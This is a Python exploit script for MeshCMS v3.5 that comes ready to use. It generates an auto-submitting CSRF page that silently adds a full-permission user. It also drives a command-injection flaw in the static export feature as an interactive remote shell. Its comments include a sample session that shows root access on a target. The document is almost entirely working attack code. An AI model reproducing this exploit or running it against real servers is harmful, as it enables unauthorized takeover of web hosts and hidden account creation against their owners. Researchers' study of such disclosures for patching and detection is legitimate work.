#!/usr/bin/python
# MeshCMS v3.5 remote code execution exploit
# Environment:
# Tomcat 7.02/ubuntu 10.04
#
# 1) details:
# There is a add member/editor/admin CSRF vulnerability in this CMS which is very clean for an attacker. 
# The admin will not be told a user has been added and will land into the admin console without any other suspicion. 
# Additionally, the user cannot be simply deleted. Access to the filesystem is required to remove the 
# private/[username].xml config file required for the users authentication.
#
# 2) details:
# The CMS actually allows users to execute a command when they backup the website files to an arbitary location on the server. 
# This is simply a design flaw and it doesn't matter if you are a member, editor or admin. You can execute code.
#
# Further notes:
# If this CMS is deployed under tomcat, they will most likley be executing code @ tomcats privileges which is usually root.
# This exploit will attempt to target both 1) and 2).
#
# Usage:
# [mr_me@pluto meshcms]$ python ./meshmeup.py -c -t 192.168.1.15:8080 -d /meshcms/ -u test -P member
#
#	| ------------------------------------------ |
#	| MeshCMS v3.5 Remote Code Execution Explo!t |
#	| by mr_me - net-ninja.net ----------------- |
# 
# (+) Writing CSRF..
# (!) Done! check index.html
# [mr_me@pluto meshcms]$ python ./meshmeup.py -e -p localhost:8080 -t 192.168.1.15:8080 -d /meshcms/ -u test -P member 
#
#	| ------------------------------------------ |
# 	| MeshCMS v3.5 Remote Code Execution Explo!t |
#	| by mr_me - net-ninja.net ----------------- |
#
# (+) Testing proxy @ localhost:8080.. proxy is found to be working!
# (+) Logging into CMS.. Logged in successfully
# (+) Be patient, the first few requests are slow.
# (+) Entering interactive remote console (q for quit)
# 
# mr_me@192.168.1.15:8080# id
# 
# uid=0(root) gid=0(root) groups=0(root)
# 
# mr_me@192.168.1.15:8080# uname -a
# 
# Linux steven-desktop 2.6.32-27-generic #49-Ubuntu SMP Wed Dec 1 23:52:12 UTC 2010 i686 GNU/Linux
# 
# mr_me@192.168.1.15:8080# q

import sys, urllib, re, urllib2, getpass
from optparse import OptionParser
from random import choice
from cookielib import CookieJar

usage = "./%prog [<options>] -t [target] -d [directory] -u [user] -P [password]"
usage += "\nExample 1: ./%prog -c -t 192.168.1.15 -d /meshcms/ -u test -P member"
usage += "\nExample 2: ./%prog -e -p localhost:8080 -t 192.168.1.15 -d /meshcms/ -u test -P member"

parser = OptionParser(usage=usage)
parser.add_option("-p", type="string",action="store", dest="proxy",
                  help="HTTP Proxy <server:port>")
parser.add_option("-t", type="string", action="store", dest="target",
                  help="The Target server <server:port>")
parser.add_option("-d", type="string", action="store", dest="dirPath",
                  help="Directory path to the CMS")
parser.add_option("-u", type="string", action="store", dest="username",
                  help="Member/Editor/Admin username")
parser.add_option("-P", type="string", action="store", dest="password",
                  help="Member/Editor/Admin password")
parser.add_option("-c", action="store_true", dest="csrf",
                  help="Create the add member CSRF")
parser.add_option("-e", action="store_true", dest="exploit",
                  help="Exploit the target with a shell (requires a valid account)")

(options, args) = parser.parse_args()

def banner():
    print "\n\t| ------------------------------------------ |"
    print "\t| MeshCMS v3.5 Remote Code Execution Explo!t |"
    print "\t| by mr_me - net-ninja.net ----------------- |\n"

if len(sys.argv) < 9:
	banner()
	parser.print_help()
	sys.exit(1)

agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
        "Microsoft Internet Explorer/4.0b1 (Windows 95)",
        "Opera/8.00 (Windows NT 5.1; U; en)"]

def getProxy():
    try:
        proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
    except(socket.timeout):
            print "\n(-) Proxy timed out"
            sys.exit(1)
    return proxy_handler
	
def testProxy():
	sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
	sys.stdout.flush()
	opener = urllib2.build_opener(getProxy())
	try:
		check = opener.open("http://www.google.com").read()
	except:
		check = 0
		pass
	if check >= 1:
		sys.stdout.write("proxy is found to be working!\n")
		sys.stdout.flush()
	else:
		print "proxy failed, exiting.."
		sys.exit(1)

def writeCsrf():
	print "(+) Writing CSRF.."
	csrf = ("<html><body onload='document.f.submit()'>"
	"<form method=post name=f action=\"http://%s%smeshcms/admin/edituser2.jsp\">"
	"<input type=\"hidden\" name=\"new\" value=\"true\">"
	"<input type=\"hidden\" name=\"username\" value=\"%s\">"
	"<input type=\"hidden\" name=\"permissions\" value=\"16777215\">"
	"<input type=\"hidden\" name=\"password1\" value=\"%s\">"
	"<input type=\"hidden\" name=\"password2\" value=\"%s\"></form></body></html>" % 
	(options.target, options.dirPath, options.username, options.password, options.password))
	try:
		mycsrf = open("index.html", "w")
		mycsrf.write(csrf)
		mycsrf.close()
	except:
		print "(-) Failed writing csrf.. exiting."
	print "(!) Done! check index.html"

def interactiveAttack(opener):
	print "(+) Be patient, the first few requests are slow."
        print "(+) Entering interactive remote console (q for quit)\n"
        hn = "%s@%s# " % (getpass.getuser(), options.target)
        cmd = ""
        while cmd != 'q':
                try:
			cmd = raw_input(hn)
			cmd = '+'.join(cmd.split())
			sploit = ("http://%s%smeshcms/admin/staticexport2.jsp?exportBaseURL=http://%s%smeshcms/"
        		"admin/help/en/index.html&exportDir=/tmp&exportCheckDates=true&exportCommand=%s&exportSaveConfig=true"
        		% (options.target, options.dirPath, options.target, options.dirPath, cmd))
        		try:
                		check = opener.open(sploit).read()
        		except urllib2.HTTPError, error:
                		check = error.read()
                		pass

			try:
				resp = check.split("standard output:")[1].split("end of standard output")[0]		
        			print resp
			except:
				pass

		except:
			break
	print "\n(-) Exiting.."

def doLogin():
	sys.stdout.write("(+) Logging into CMS.. ")
	sys.stdout.flush()
	adminIndex = "http://" + options.target + options.dirPath + "meshcms/admin/login.jsp"
	values = {'username' : options.username, 'password' : options.password } 
	data = urllib.urlencode(values)
	cj = CookieJar()
	if options.proxy:
		try:
			opener = urllib2.build_opener(getProxy(), urllib2.HTTPCookieProcessor(cj))
			check = opener.open(adminIndex, data).read()
		except:
			print "\n(-) Proxy connection failed to remote target"
			sys.exit(1)
	else:
        	try:
			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
			check = opener.open(adminIndex, data).read()
        	except:
			print "(-) Target connection failed, check your address"
			sys.exit(1)
	if re.search("Login successful", check):
		sys.stdout.write("Logged in successfully\n")
		sys.stdout.flush()
	else:
		sys.stdout.write("Login Failed! Exiting..\n")
		sys.stdout.flush()
		sys.exit(1)
	return opener

if __name__ == "__main__":
	banner()
	if options.exploit:
		if options.proxy:
			testProxy()
		myopener = doLogin()
		interactiveAttack(myopener)
	elif options.csrf:
		writeCsrf()
		addadmin = ""